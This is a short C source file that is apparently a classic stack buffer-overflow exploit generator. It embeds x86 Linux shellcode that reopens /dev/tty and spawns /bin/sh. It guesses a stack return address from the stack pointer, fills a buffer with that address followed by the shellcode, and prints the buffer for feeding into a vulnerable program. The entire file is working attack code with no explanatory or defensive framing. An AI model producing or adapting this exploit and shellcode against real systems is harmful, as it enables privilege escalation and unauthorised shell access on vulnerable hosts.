#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_OFFSET                  200 
#define DEFAULT_BUFFER_SIZE             256

char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";


unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char **argv)
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize+32))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  /* printf("Using address: 0x%x\n", addr); */

/*
  for (i = 0; i < (bsize+32)/4; i++)
	*(long_ptr + i) = (int) strtoul(argv[1], NULL, 16);
*/
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize+32; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < (int) strlen(sc); i++)
     *(ptr++) = sc[i];
  printf("%s", buff);
	return 0;
}

